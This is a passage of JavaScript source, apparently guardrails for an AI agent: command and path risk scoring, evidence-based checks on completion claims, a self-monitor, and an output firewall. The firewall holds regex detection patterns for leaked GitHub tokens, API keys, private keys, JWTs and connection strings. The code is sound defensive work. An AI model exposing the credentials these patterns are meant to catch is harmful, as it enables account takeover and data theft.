                    hits.push({ pattern: "indirect-delete", snippet: m ? m[0] : "" });
                }
            }
            return buildRiskResult(isDelete, isDelete, hits, []);
        }

        function pathRisk(path, operation) {
            var p = safeString(path);
            // operation: "read" | "write" | "delete" | undefined (unknown)
            var isWrite = (operation === "write" || operation === "delete");
            if (PathUtils.hasTraversal(p)) {
                return buildRiskResult(false, true, [], [{
                    path: p,
                    why: "路径含 '..' 遍历片段",
                }]);
            }
            var pathRisks = [];
            var requiresConfirmation = false;
            var rplist = riskyPaths();
            for (var i = 0; i < rplist.length; i++) {
                if (rplist[i].re.test(p)) {
                    // writeOnly entries skip read operations
                    if (rplist[i].writeOnly && !isWrite) continue;
                    pathRisks.push({ path: p, why: rplist[i].why });
                    requiresConfirmation = true;
                }
            }
            return buildRiskResult(false, requiresConfirmation, [], pathRisks);
        }

        function buildRiskResult(isDelete, requiresConfirmation, hits, pathRisks) {
            var reasons = [];
            for (var i = 0; i < hits.length; i++) {
                var h = hits[i];
                reasons.push(
                    (h.soft ? "覆盖风险: " : "删除操作: ") +
                        (h.desc || h.pattern) +
                        (h.snippet ? " [" + h.snippet + "]" : "")
                );
            }
            for (var j = 0; j < pathRisks.length; j++) {
                reasons.push("高风险路径: " + pathRisks[j].path + "（" + pathRisks[j].why + "）");
            }
            var level = "LOW";
            if (isDelete && pathRisks.length > 0) level = "CRITICAL";
            else if (isDelete || pathRisks.length > 0) level = "HIGH";
            else if (hits.length > 0) level = "MEDIUM";
            var seen = {};
            var uniq = [];
            for (var k = 0; k < reasons.length; k++) {
                if (!seen[reasons[k]]) { seen[reasons[k]] = true; uniq.push(reasons[k]); }
            }
            return {
                is_delete: isDelete,
                requires_confirmation: requiresConfirmation,
                risk_level: level,
                hits: hits,
                path_risks: pathRisks,
                reasons: uniq,
            };
        }

        return { analyzeCommand: analyzeCommand, scanScript: scanScript, pathRisk: pathRisk };
    })();

    // ======================================================================
    // §13 Hallucination — confidence-label governance
    //
    // IMPORTANT: When a fact-claim is detected (e.g. "编译通过"), this module
    // no longer trusts regex evidence alone. It delegates to Evidence.classify()
    // to actually verify the claim against tool results. This closes the
    // "AI says done but evidence contradicts" bypass that v2.5.x had.
    //
    // Evidence instance is injected at create() time via setEvidence().
    // If no Evidence is injected, falls back to legacy regex grading.
    // ======================================================================
    var Hallucination = (function () {
        function factClaims() { return ConfigRegistry.get("hallucination.fact_claims", []); }
        function absoluteWords() { return ConfigRegistry.get("hallucination.absolute_words", []); }
        function overconfidentWords() { return ConfigRegistry.get("hallucination.overconfident_words", []); }
        function techPatterns() { return ConfigRegistry.get("hallucination.tech_patterns", []); }
        function validLabels() { return ConfigRegistry.get("hallucination.valid_labels", []); }

        function extractLabel(text) {
            var labels = validLabels();
            if (!text) return null;
            // Use word-boundary regex to prevent substring false matches:
            // "well-KNOWN" should NOT match "UNKNOWN".
            // "INFERENCE" should NOT match "INFERRED".
            // "UNVERIFIED" should NOT match "VERIFIED".
            for (var i = 0; i < labels.length; i++) {
                var re = new RegExp("(^|[^A-Za-z])" + labels[i] + "($|[^A-Za-z])");
                if (re.test(text)) return labels[i];
            }
            return null;
        }

        // Evidence instance injected from outside (set by create())
        // When set, fact-claim verification is delegated to Evidence.classify()
        // so that "AI says done but evidence contradicts" cannot pass.
        var _evidenceInstance = null;
        function setEvidence(ev) { _evidenceInstance = ev; }

        function hasAny(text, words) {
            for (var i = 0; i < words.length; i++) {
                if (text.indexOf(words[i]) >= 0) return words[i];
            }
            return null;
        }

        // Structural evidence parser: extract concrete signals from evidence text
        // Recognizes: exit codes, build outputs, test results, file paths
        function parseEvidenceSignals(evidence) {
            if (!evidence) return { count: 0, signals: [], hasStrong: false };
            var text = safeString(evidence);
            var signals = [];

            // Exit code pattern
            var exitMatch = text.match(/exit[_-]?code[:\s=]+(\d+)/i);
            if (exitMatch) {
                var code = parseInt(exitMatch[1], 10);
                signals.push({ type: "exit_code", value: code, success: code === 0 });
            }

            // Build success patterns
            if (/BUILD\s+SUCCESSFUL|build\s+success|compiled\s+successfully/i.test(text)) {
                signals.push({ type: "build_success", success: true });
            }

            // Test pass patterns
            var testMatch = text.match(/(\d+)\s*(tests?|specs?)\s*(passed|successful|ok)/i);
            if (testMatch) signals.push({ type: "test_pass", count: parseInt(testMatch[1], 10), success: true });

            // Failure patterns
            if (/\b(error|failed|fatal|panic|exception)\b/i.test(text) && !/0\s+errors/i.test(text)) {
                signals.push({ type: "has_error", success: false });
            }

            // File path reference (count as weaker signal)
            var pathMatches = text.match(/\/[\w\-\.\/]+\.\w+/g);
            if (pathMatches) signals.push({ type: "path_refs", count: pathMatches.length, success: true });

            // JSON-like key:value supports array
            var supportsMatch = text.match(/supports[:\s=]+\[([^\]]+)\]/i);
            if (supportsMatch) {
                var parts = supportsMatch[1].split(",").map(function (s) { return s.trim(); });
                signals.push({ type: "supports", items: parts, success: parts.length > 0 });
            }

            var hasStrong = signals.some(function (s) {
                return (s.type === "build_success" && s.success) ||
                       (s.type === "test_pass" && s.success) ||
                       (s.type === "exit_code" && s.success);
            });

            return { count: signals.length, signals: signals, hasStrong: hasStrong };
        }

        // Evidence-quality grade: L0-L6 based on structural analysis
        function gradeEvidence(evidence) {
            var p = parseEvidenceSignals(evidence);
            if (p.count === 0) return 0;
            if (p.hasStrong) return 5;
            if (p.signals.some(function (s) { return s.type === "supports"; })) return 4;
            if (p.signals.some(function (s) { return s.type === "path_refs"; })) return 3;
            return 2;
        }

        async function check(rawText, evidence) {
            var text = safeString(rawText);
            var evidenceText = safeString(evidence);
            var hasEvidence = evidenceText.trim().length > 0;
            var evidenceGrade = gradeEvidence(evidence);
            var hasStrongEvidence = evidenceGrade >= 4;
            var violations = [];
            var currentLabel = extractLabel(text);

            var factWord = hasAny(text, factClaims());
            var isFactClaim = !!factWord;

            if (isFactClaim && !hasEvidence) {
                violations.push({
                    rule: "fact_without_evidence",
                    hit: factWord,
                    fix: "补充工具执行证据，或改为『正在...』过程描述",
                });
            } else if (isFactClaim && hasEvidence && !hasStrongEvidence) {
                // Strong fact claim but only weak evidence — flag but don't block
                violations.push({
                    rule: "fact_with_weak_evidence",
                    hit: factWord,
                    fix: "事实声明应附强证据（构建产物/测试通过/退出码），当前证据等级 L" + evidenceGrade,
                    severity: "minor",
                });
            }

            var mentionsToolOutput = /(工具(返回|输出|结果)|命令(返回|输出)|日志显示|logcat)/.test(text);
            if (mentionsToolOutput && !hasEvidence) {
                violations.push({
                    rule: "fabricated_citation",
                    fix: "引用必须可追溯到真实工具执行记录，否则删除该引用",
                });
            }

            var absWord = hasAny(text, absoluteWords());
            if (absWord && currentLabel !== "VERIFIED") {
                violations.push({
                    rule: "absolute_without_verified",
                    hit: absWord,
                    fix: "绝对化断言必须带 VERIFIED 标签和工具结果引用，否则降级 GUESSED",
                });
            }

            var ocWord = hasAny(text, overconfidentWords());
            if (ocWord) {
                violations.push({
                    rule: "overconfident",
                    hit: ocWord,
                    fix: "需 >=2 独立来源交叉验证，否则替换为 INFERRED",
                });
            }

            var tpList = techPatterns();
            for (var i = 0; i < tpList.length; i++) {
                if (tpList[i].test(text)) {
                    var m = text.match(tpList[i]);
                    violations.push({
                        rule: "unsourced_tech_assertion",
                        hit: m ? m[0] : "",
                        fix: "必须引用官方文档/版本发行说明，否则加 UNKNOWN 标签并标『需查证』",
                    });
                    break;
                }
            }

            var isConclusive = isFactClaim || !!absWord || /结论|判定|确认为|证实/.test(text);
            var isProcess = /^(正在|准备|接下来|开始)/.test(text.trim());
            if (isConclusive && !currentLabel && !isProcess && !hasEvidence) {
                violations.push({
                    rule: "missing_confidence_label",
                    fix: "结论性声明必须附 VERIFIED/INFERRED/GUESSED/UNKNOWN 之一，或提供证据",
                });
            }

            // ============================================================
            // CRITICAL: Cross-check with Evidence.classify()
            // When a fact-claim is detected AND we have a real Evidence
            // instance, delegate verification. If Evidence says the claim
            // is NOT supported, block (override any regex-based "weak
            // evidence" allowance).
            //
            // The bypass this closes:
            //   "AI says '编译成功' + evidence: 'BUILD FAILED, 5 errors'"
            //   Previously: regex-grade L0/L1 (no strong signal), allowed with
            //               minor "fact_with_weak_evidence" warning.
            //   Now: Evidence.classify parses "BUILD FAILED" → L0 NEGATIVE,
            //        supports_claim=false → BLOCK.
            // ============================================================
            var evidenceVerdict = null;
            if (isFactClaim && _evidenceInstance && hasEvidence) {
                // Parse the evidence string into Evidence.classify() context
                var evidenceCtx = parseEvidenceContext(evidenceText);
                evidenceVerdict = await _evidenceInstance.classify(rawText || text, evidenceCtx);
                // If Evidence verdict says NOT supported, ALWAYS add a blocking
                // violation — regardless of regex grade.
                if (!evidenceVerdict.supports_claim) {
                    violations.push({
                        rule: "evidence_contradicts_claim",
                        hit: factWord,
                        evidence_level: evidenceVerdict.level,
                        evidence_label: evidenceVerdict.label,
                        fix: "声明含『" + factWord + "』但 Evidence 判定为 " + evidenceVerdict.level +
                             " (" + evidenceVerdict.label + ")，禁止使用完成字眼。" +
                             " 原因: " + (evidenceVerdict.reasons || []).join("; "),
                    });
                }
                // If Evidence found the claim IS supported, upgrade confidence
                if (evidenceVerdict.supports_claim && evidenceVerdict.level_num >= 3) {
                    if (!currentLabel) currentLabel = "VERIFIED";
                }
            }

            var suggestedLabel;
            // Evidence verdict takes priority over regex when present
            if (evidenceVerdict && evidenceVerdict.supports_claim) {
                suggestedLabel = evidenceVerdict.label || "VERIFIED";
            } else if (evidenceVerdict && !evidenceVerdict.supports_claim) {
                suggestedLabel = "GUESSED";
            } else if (hasStrongEvidence) {
                suggestedLabel = "VERIFIED";
            } else if (hasEvidence) {
                suggestedLabel = "INFERRED";
            } else if (isFactClaim || absWord) {
                suggestedLabel = "GUESSED";
            } else if (ocWord) {
                suggestedLabel = "INFERRED";
            } else {
                suggestedLabel = "UNKNOWN";
            }

            var allowed = violations.filter(function (v) { return v.severity !== "minor"; }).length === 0;
            return {
                allowed: allowed,
                current_label: currentLabel,
                suggested_label: suggestedLabel,
                has_evidence: hasEvidence,
                evidence_grade: evidenceVerdict ? evidenceVerdict.level_num : evidenceGrade,
                evidence_level: evidenceVerdict ? evidenceVerdict.level : null,
                is_fact_claim: isFactClaim,
                violations: violations,
                evidence_verdict: evidenceVerdict ? {
                    level: evidenceVerdict.level,
                    label: evidenceVerdict.label,
                    supports_claim: evidenceVerdict.supports_claim,
                    can_claim_done: evidenceVerdict.can_claim_done,
                    reasons: evidenceVerdict.reasons,
                } : null,
                verdict: allowed
                    ? "PASS"
                    : "BLOCK: 存在 " + violations.filter(function (v) { return v.severity !== "minor"; }).length + " 处幻觉风险，需修正后输出",
            };
        }

        // Parse an evidence string (the second arg to hallucination_guard)
        // into the context object that Evidence.classify() expects.
        // Recognizes:
        //   - "exit_code: 0" / "exit-code=1" / "returncode: 0"
        //   - "artifact: /path/to/file" / "artifact_path: /path"
        //   - "stdout: ..." / "stderr: ..."
        //   - multi-line: splits into stdout vs stderr by section marker
        function parseEvidenceContext(evidenceText) {
            var ctx = {};
            var text = safeString(evidenceText);
            if (!text) return ctx;

            // exit_code patterns — anchor on a word/line boundary so
            // "exit_code: 0abc" doesn't parse as 0.
            var exitMatch = text.match(/(?:exit[_-]?code|returncode|return[_-]?code)[:\s=]+(-?\d+)(?:\b|$)/im);
            if (exitMatch) {
                ctx.exit_code = parseInt(exitMatch[1], 10);
            }

            // artifact_path patterns
            var artifactMatch = text.match(/artifact[_\s]*(?:path)?[:\s=]+(\/[^\s,;]+)/i);
            if (artifactMatch) {
                ctx.artifact_path = artifactMatch[1];
            }

            // stdout/stderr sections
            var stdoutMatch = text.match(/stdout[:\s=]+([^\n]*?)(?=\n\s*(?:stderr|artifact|exit|$))/is);
            var stderrMatch = text.match(/stderr[:\s=]+([^\n]*?)(?=\n\s*(?:stdout|artifact|exit|$))/is);
            if (stdoutMatch) ctx.stdout = stdoutMatch[1].trim();
            if (stderrMatch) ctx.stderr = stderrMatch[1].trim();

            // If no explicit stdout/stderr, use full text as stdout (most common case)
            if (!ctx.stdout && !ctx.stderr) {
                ctx.stdout = text;
            }

            return ctx;
        }

        return { check: check, gradeEvidence: gradeEvidence, parseEvidenceSignals: parseEvidenceSignals, setEvidence: setEvidence };
    })();

    // Evidence instance reference — set by setEvidenceForHallucination().
    // The Hallucination module's check() reads this at call time to verify
    // fact claims against real evidence (not just regex patterns).
    var _hallucinationEvidenceRef = { evidence: null };
    function setEvidenceForHallucination(evidenceInstance) {
        _hallucinationEvidenceRef.evidence = evidenceInstance;
        if (Hallucination.setEvidence) Hallucination.setEvidence(evidenceInstance);
    }

    // ======================================================================
    // §14 Evidence — L0-L6 classification with real fs check
    // Files dependency injected.
    // MUST be defined before §13 Hallucination because Hallucination now
    // delegates to it for fact-claim verification.
    // ======================================================================
    function EvidenceModule(deps) {
        deps = deps || {};
        var Files = deps.Files;

        function buildRegex(key) {
            return ConfigRegistry.get("evidence." + key);
        }

        async function fileExists(path) {
            if (!path) return false;
            if (!Files) return false;
            // Prefer Files.exists when available (Operit operational_tools provides it)
            if (typeof Files.exists === "function") {
                try {
                    var r = await Files.exists(path);
                    if (typeof r === "boolean") return r;
                    if (r && typeof r === "object" && typeof r.exists === "boolean") return r.exists;
                    // Some impls return 1/0
                    if (r === 1 || r === 0) return r === 1;
                } catch (e) {}
            }
            // Fallback: read with low cost and treat ENOENT as false
            try {
                var r2 = await Files.read(path);
                if (!r2) return false;
                if (typeof r2 === "string") return r2.length > 0;
                if (typeof r2.exists === "boolean") return r2.exists;
                if (r2.content !== undefined && r2.content !== null) return true;
                if (r2.error || r2.code) return false;
                return false;
            } catch (e) {
                return false;
            }
        }

        // Real stderr error detection: scan stderr for actual error patterns
        // (NOT just the word "error" — must be a real error marker, excluding
        // benign contexts like "0 errors" or "no error")
        function stderrHasError(stderr) {
            if (!stderr) return false;
            var s = String(stderr);
            // Real error markers (case-insensitive, word-bounded)
            var patterns = [
                /\berror[:!]/i,                          // "error:" / "error!"
                /\bERROR\s*:/,                           // compiler "ERROR:"
                /\bBuild failed\b/i,
                /\bBUILD\s+FAILED\b/,
                /\bfatal\s*error/i,
                /\bcompilation\s+failed\b/i,
                /\bpanic\s*:/,                           // Go panic
                /\bException\s+in\s+thread\b/i,          // Java
                /\bSegmentation\s+fault\b/i,
                /\bundefined\s+reference\s+to\b/i,        // linker error
                /\bld\s+returned\s+1\s+exit\s+status\b/i,
                /\bTraceback\s+\(most\s+recent\s+call\s+last\)/i,  // Python
                /\bENOENT\b/,
                /\bEACCES\b/,
                /\bPermission\s+denied\b/i,
                /\bNo\s+such\s+file\s+or\s+directory\b/i,
            ];
            for (var i = 0; i < patterns.length; i++) {
                if (patterns[i].test(s)) return true;
            }
            // Generic "error" word, but excluding benign "0 errors" / "no error" / "ignore"
            if (/\berror\b/i.test(s)) {
                if (/\b0\s+errors?\b/i.test(s)) return false;
                if (/\bno\s+errors?\b/i.test(s)) return false;
                if (/\bignore[ds]?\s+(the\s+)?error/i.test(s)) return false;
                if (/\berror\s+count\s*[:=]\s*0\b/i.test(s)) return false;
                return true;
            }
            return false;
        }

        // Extract candidate file paths from text (absolute paths starting with /)
        function extractFilePaths(text) {
            if (!text) return [];
            var s = String(text);
            // Match: /foo/bar.js, /usr/local/bin, /tmp/test.log (not URLs, not flags)
            var matches = s.match(/(?<![\w/])\/[\w][\w\-\.\/]{1,200}\.[a-zA-Z0-9]{1,8}(?![\w/])/g) || [];
            // Filter out obvious noise
            var filtered = [];
            var seen = {};
            for (var i = 0; i < matches.length; i++) {
                var p = matches[i];
                if (p.indexOf("//") === 0) continue;       // URLs
                if (p.indexOf("http") === 0) continue;
                if (/\.git(\/|$)/.test(p)) continue;       // .git internals
                if (!seen[p]) { seen[p] = true; filtered.push(p); }
            }
            return filtered.slice(0, 5);  // limit per claim
        }

        // Verifies if at least one of the candidate paths actually exists on disk.
        // Returns { found: [paths...], missing: [paths...], any_real: bool }.
        async function verifyPathExistence(paths) {
            if (!paths || paths.length === 0) return { found: [], missing: [], any_real: false };
            var found = [];
            var missing = [];
            for (var i = 0; i < paths.length; i++) {
                var exists = await fileExists(paths[i]);
                if (exists) found.push(paths[i]);
                else missing.push(paths[i]);
            }
            return { found: found, missing: missing, any_real: found.length > 0 };
        }

        async function classify(claim, ctx) {
            ctx = ctx || {};
            var claimText = safeString(claim);
            var hasExit = typeof ctx.exit_code === "number";
            var stdout = safeString(ctx.stdout);
            var stderr = safeString(ctx.stderr);
            var combined = stdout + "\n" + stderr;

            var level = "L0";
            var label = "UNKNOWN";
            var supports = false;
            var reasons = [];

            // Step 1: artifact_path is the strongest signal — must exist on disk
            if (ctx.artifact_path) {
                var exists = await fileExists(ctx.artifact_path);
                if (exists) {
                    level = "L4";
                    label = "VERIFIED";
                    supports = true;
                    reasons.push("产物真实存在: " + ctx.artifact_path);
                } else {
                    reasons.push("声称的产物不存在: " + ctx.artifact_path);
                    return result("L0", "NEGATIVE", false, reasons, ctx);
                }
            }

            // Step 2: exit_code + stderr — real error detection (not just regex)
            if (hasExit) {
                var BUILD_FAIL = buildRegex("build_fail");
                var BUILD_OK = buildRegex("build_ok");
                var INSTALL_OK = buildRegex("install_ok");
                var TEST_OK = buildRegex("test_ok");

                if (ctx.exit_code !== 0) {
                    reasons.push("退出码 " + ctx.exit_code + " 非0，声明被否证");
                    return result("L0", "NEGATIVE", false, reasons, ctx);
                }

                // exit_code=0 but stderr has real errors → DOWNGRADE to L0/NEGATIVE
                // This is the critical fix: previously exit_code:0 was L5 regardless.
                if (stderrHasError(stderr)) {
                    reasons.push("退出码0但 stderr 含真实错误，声明被否证");
                    if (ctx.artifact_path && level === "L4") {
                        reasons.push("产物存在但 stderr 错误，降级处理");
                        return result("L2", "NEGATIVE", false, reasons, ctx);
                    }
                    return result("L0", "NEGATIVE", false, reasons, ctx);
                }

                if (BUILD_FAIL.test(combined)) {
                    reasons.push("输出含失败标记，声明被否证");
                    return result("L0", "NEGATIVE", false, reasons, ctx);
                }

                // exit_code=0 + clean stderr → log-based level assignment
                if (BUILD_OK.test(combined)) {
                    if (level === "L0") level = "L3";
                    label = "VERIFIED";
                    supports = true;
                    reasons.push("编译成功日志已验证");
                }
                if (INSTALL_OK.test(combined)) {
                    level = "L4";
                    label = "VERIFIED";
                    supports = true;
                    reasons.push("安装/启动成功日志已验证");
                }
                if (TEST_OK.test(combined)) {
                    if (level === "L0" || level === "L1" || level === "L2") level = "L5";
                    label = "VERIFIED";
                    supports = true;
                    reasons.push("测试通过日志已验证");
                }

                // L6: exit_code=0 + clean stderr + artifact_path exists
                // The most rigorous level: all three independent signals aligned.
                if (ctx.artifact_path && level === "L4" && supports) {
                    level = "L6";
                    label = "VERIFIED";
                    reasons.push("L6: 退出码0 + stderr 干净 + 产物存在");
                }
            }

            // Step 3: no exit_code given, fall back to text + path verification
            if (level === "L0" && !hasExit) {
                // Auto-detect file paths in stdout and verify existence
                var candidates = extractFilePaths(stdout);
                if (candidates.length > 0) {
                    var verified = await verifyPathExistence(candidates);
                    if (verified.any_real) {
                        level = "L3";
                        label = "VERIFIED";
                        supports = true;
                        reasons.push("路径在 stdout 中被引用且真实存在: " + verified.found.join(", "));
                        if (verified.missing.length > 0) {
                            reasons.push("以下路径被引用但不存在: " + verified.missing.join(", "));
                        }
                    } else {
                        reasons.push("stdout 引用了 " + candidates.length + " 个路径但均不存在（可能是 AI 虚构）");
                    }
                }

                // No exit_code but stdout matches a known-success pattern:
                // give L3 (text-based but log-level evidence).
                // This keeps backward compat with tests that pass raw text.
                if (level === "L0") {
                    var BUILD_OK2 = buildRegex("build_ok");
                    var INSTALL_OK2 = buildRegex("install_ok");
                    var TEST_OK2 = buildRegex("test_ok");

                    if (BUILD_OK2.test(stdout)) {
                        level = "L3";
                        label = "INFERRED";
                        supports = true;
                        reasons.push("stdout 含编译成功标记但缺 exit_code，降级为 L3 INFERRED");
                    } else if (INSTALL_OK2.test(stdout)) {
                        level = "L3";
                        label = "INFERRED";
                        supports = true;
                        reasons.push("stdout 含安装成功标记但缺 exit_code，降级为 L3 INFERRED");
                    } else if (TEST_OK2.test(stdout)) {
                        level = "L2";
                        label = "INFERRED";
                        supports = true;
                        reasons.push("文本级测试通过描述");
                    } else if (stdout.trim().length > 0) {
                        level = "L1";
                        label = "INFERRED";
                        reasons.push("有文本证据但未达编译级");
                    } else {
                        reasons.push("无任何证据");
                    }
                }
            }

            var needsBuild = /编译|构建|compile|build/i.test(claimText);
            if (needsBuild && levelNum(level) < 3 && !supports) {
                reasons.push("编译类声明但未达 L3，禁止使用『完成』字眼");
            }

            return result(level, label, supports, reasons, ctx);
        }

        function levelNum(l) { return parseInt(safeString(l).replace("L", ""), 10) || 0; }

        function result(level, label, supports, reasons, ctx) {
            var n = levelNum(level);
            return {
                level: level,
                level_num: n,
                label: label,
                supports_claim: supports,
                can_claim_done: n >= 3 && supports,
                can_claim_delivered: n >= 5 && supports,
                reasons: reasons,
                gate: n >= 3 && supports
                    ? "ALLOW"
                    : "BLOCK: 验证等级 " + level + " 低于 L3，禁止宣称完成",
            };
        }

        return {
            classify: classify,
            fileExists: fileExists,
            extractFilePaths: extractFilePaths,
            verifyPathExistence: verifyPathExistence,
            stderrHasError: stderrHasError,
        };
    }

    // ======================================================================
    // §15 SelfMonitor — 6-dim meta-state + cognitive bias
    // status_card rendered via TemplateStore.
    // ======================================================================
    var SelfMonitor = (function () {
        function biasPatterns() {
            return ConfigRegistry.get("self_monitor.bias_patterns", []);
        }

        function assess(opts) {
            opts = opts || {};
            var goal = safeString(opts.goal);
            var goalClear = opts.goal_clear !== false && goal.trim().length >= 4;
            var filesRead = !!opts.files_read;
            var evidenceReady = !!opts.evidence_ready;
            var irreversibleRisk = !!opts.irreversible_risk;

            // Principle-2 (Token conservation): detect repeated tool calls.
            // Caller passes recent_tools as array of tool name strings.
            var recentTools = Array.isArray(opts.recent_tools) ? opts.recent_tools : [];
            var repeatWarnings = [];
            if (recentTools.length > 1) {
                var toolCounts = {};
                for (var ri = 0; ri < recentTools.length; ri++) {
                    var tn = recentTools[ri];
                    toolCounts[tn] = (toolCounts[tn] || 0) + 1;
                }
                var toolKeys = Object.keys(toolCounts);
                for (var ki = 0; ki < toolKeys.length; ki++) {
                    if (toolCounts[toolKeys[ki]] >= 2) {
                        repeatWarnings.push(toolKeys[ki] + " 已调用 " + toolCounts[toolKeys[ki]] + " 次，优先复用已有结果");
                    }
                }
            }

            var confidence;
            if (evidenceReady) confidence = "VERIFIED";
            else if (filesRead) confidence = "INFERRED";
            else confidence = "UNKNOWN";

            var biases = [];
            var bplist = biasPatterns();
            for (var i = 0; i < bplist.length; i++) {
                if (bplist[i].re.test(goal)) {
                    biases.push({ bias: bplist[i].bias, warn: bplist[i].warn });
                }
            }

            var causalMarkers = (goal.match(/因为|所以|导致|然后|接着|之后|再|才能/g) || []).length;
            var causalDepth = causalMarkers >= 3 ? "deep" : causalMarkers >= 1 ? "medium" : "shallow";

            var readiness = 0;
            if (goalClear) readiness += 25;
            if (filesRead) readiness += 25;
            if (evidenceReady) readiness += 25;
            if (!irreversibleRisk) readiness += 25;

            var needsConfirmation = irreversibleRisk;
            var blockers = [];
            if (!goalClear) blockers.push("目标不清晰，需澄清");
            if (irreversibleRisk) blockers.push("存在不可逆风险，需用户确认");
            if (!filesRead && /修改|重构|修复|删除/.test(goal)) {
                blockers.push("改动类任务但未读取相关文件");
            }
            // Principle-2: repeat calls count as a blocker
            if (repeatWarnings.length > 0) {
                blockers.push("重复工具调用：" + repeatWarnings.join("; "));
            }

            var statusCard = TemplateStore.render("status_card", {
                readiness: readiness,
                confidence: confidence,
                causal: causalDepth,
                blockers: blockers.length ? " · 阻塞: " + blockers.join("; ") : " · 无阻塞",
            });

            return {
                dimensions: {
                    goal_clear: goalClear,
                    files_read: filesRead,
                    evidence_ready: evidenceReady,
                    irreversible_risk: irreversibleRisk,
                    needs_confirmation: needsConfirmation,
                    confidence: confidence,
                    repeat_tool_calls: repeatWarnings.length > 0,
                },
                readiness_score: readiness,
                causal_depth: causalDepth,
                cognitive_biases: biases,
                blockers: blockers,
                repeat_warnings: repeatWarnings,
                state: blockers.length === 0 ? "READY" : "NOT_READY",
                status_card: statusCard,
            };
        }

        return { assess: assess };
    })();

    // ======================================================================
    // §16 OutputFirewall — six violation classes
    // Uses OutputChunker for oversized-block detection.
    // ======================================================================
    var OutputFirewall = (function () {
        function thoughtLeak() { return ConfigRegistry.get("output_firewall.thought_leak", []); }
        function toolLeak() { return ConfigRegistry.get("output_firewall.tool_leak", []); }
        function filler() { return ConfigRegistry.get("output_firewall.filler", []); }
        function emotional() { return ConfigRegistry.get("output_firewall.emotional", []); }

         function check(rawText) {
            var text = safeString(rawText);
            var violations = [];

            // Secret / credential leak detection
            var secretPatterns = [
                { re: /ghp_[A-Za-z0-9]{20,}/g, label: "GitHub Token" },
                { re: /sk-[A-Za-z0-9]{20,}/g, label: "API Key (sk-)" },
                { re: /-----BEGIN (RSA |EC |DSA |OPENSSH |PRIVATE )?PRIVATE KEY-----/, label: "Private Key" },
                { re: /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g, label: "Email Address" },
                { re: /(mysql|postgres|mongodb|redis):\/\/[^\s]+/gi, label: "Connection String" },
                { re: /(password|passwd|secret|token|api_key)\s*[:=]\s*['"][^'"]{8,}['"]/gi, label: "Credential Assignment" },
                { re: /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g, label: "JWT Token" },
            ];
            for (var si = 0; si < secretPatterns.length; si++) {
                var sp = secretPatterns[si];
                var sm = text.match(sp.re);
                if (sm) {
                    violations.push({ type: "secret_leak", hit: sp.label + " (" + sm.length + " occurrences)", fix: "Replace with [REDACTED]" });
                }
            }

            var tl = thoughtLeak();
            for (var i = 0; i < tl.length; i++) {
                if (text.indexOf(tl[i]) >= 0) violations.push({ type: "thought_leak", hit: tl[i] });
            }
            var toolL = toolLeak();
            for (var j = 0; j < toolL.length; j++) {
                if (toolL[j].test(text)) {
                    var m = text.match(toolL[j]);
                    violations.push({ type: "tool_leak", hit: m ? m[0] : "" });
                }
            }
            var fl = filler();
            for (var k = 0; k < fl.length; k++) {
                if (text.indexOf(fl[k]) >= 0) violations.push({ type: "filler", hit: fl[k] });
            }
            var el = emotional();
            for (var e = 0; e < el.length; e++) {
                if (text.indexOf(el[e]) >= 0) violations.push({ type: "emotional", hit: el[e] });
            }

            var fences = text.match(/```[\s\S]*?```/g) || [];
            for (var b = 0; b < fences.length; b++) {
                var block = fences[b];
                var lines = OutputChunker.countLines(block) - 2;
                if (lines > 10 || block.length > 300) {
                    violations.push({
                        type: "oversized_code_block",
                        hit: lines + " 行代码块",
                        fix: "代码必须写入文件，用工具而非对话框输出",
                    });
                }
            }

            // Bug#8 fix: also detect oversized plain-text output (no code fences)
            // Strip code blocks first, then measure remaining plain text
            var plainText = text.replace(/```[\s\S]*?```/g, "");
            var plainLines = plainText.split("\n").length;
            var MAX_PLAIN_LINES = 150;
            var MAX_PLAIN_CHARS = 6000;
            if (plainLines > MAX_PLAIN_LINES || plainText.length > MAX_PLAIN_CHARS) {
                violations.push({
                    type: "oversized_plain_output",
                    hit: plainLines + " 行纯文本 / " + plainText.length + " 字符",
                    fix: "大段文本应写入文件后给出路径，而非直接输出",
                });
            }

            if (/[\uFFFD]/.test(text) || /[\x00-\x08\x0B\x0C\x0E-\x1F]/.test(text)) {
                violations.push({ type: "mojibake", hit: "非可见控制字符/替换字符" });
            }

            var sentences = text.split(/[。！？.!?\n]+/).filter(Boolean);
            var severity;
            var hasSevere = false;
            for (var v = 0; v < violations.length; v++) {
                if (violations[v].type === "tool_leak" || violations[v].type === "mojibake" || violations[v].type === "secret_leak") {
                    hasSevere = true; break;
                }
            }
            if (hasSevere) severity = "SEVERE";
            else if (violations.length > Math.max(1, sentences.length / 2)) severity = "MAJOR";
            else if (violations.length > 0) severity = "MINOR";
            else severity = "CLEAN";

            var action;
            if (severity === "SEVERE" || severity === "MAJOR") action = "BLOCK: 必须重写后输出";
            else if (severity === "MINOR") action = "FILTER: 过滤违规片段后输出";
            else action = "PASS";

            return {
                clean: violations.length === 0,
                severity: severity,
                action: action,
                violations: violations,
            };
        }

        return { check: check };
    })();

    // ======================================================================
    // §17 OpenSource — GitHub API search with retry + concurrency
    // Network dependency injected; RetryPolicy + ConcurrencyLimiter applied.
    // ======================================================================
    function OpenSourceModule(deps) {
        deps = deps || {};
        var Network = deps.Network;
        var retry = new RetryPolicy({
            maxAttempts: ConfigRegistry.get("opensource.max_attempts", 3),
            baseDelayMs: ConfigRegistry.get("opensource.base_delay_ms", 500),
            maxDelayMs: ConfigRegistry.get("opensource.max_delay_ms", 4000),
        });
        var limiter = new ConcurrencyLimiter(ConfigRegistry.get("opensource.max_concurrency", 2));

        function buildUrl(keyword, language, minStars, limit) {
            var q = encodeURIComponent(
                safeString(keyword) +
                    (language ? " language:" + language : "") +
                    " stars:>=" + minStars
            );
            return (
                "https://api.github.com/search/repositories?q=" +
                q +
                "&sort=stars&order=desc&per_page=" +
                limit
            );
        }

        async function search(keyword, language, minStars, limit) {
            minStars = minStars != null ? minStars : ConfigRegistry.get("opensource.default_min_stars", 500);
            limit = limit != null ? limit : ConfigRegistry.get("opensource.default_limit", 5);

            if (!keyword || !safeString(keyword).trim()) {
                return {
                    success: false,
                    code: ErrorCode.MISSING_REQUIRED,
                    error: "keyword 为必填",
                };
            }
            if (!Network || (typeof Network.httpGet !== "function" && typeof Network.get !== "function")) {
                return {
                    success: false,
                    code: ErrorCode.DEPENDENCY_MISSING,
                    error: "Network 依赖不可用",
                };
            }
            // Operit exposes both httpGet and get; pick whichever is available
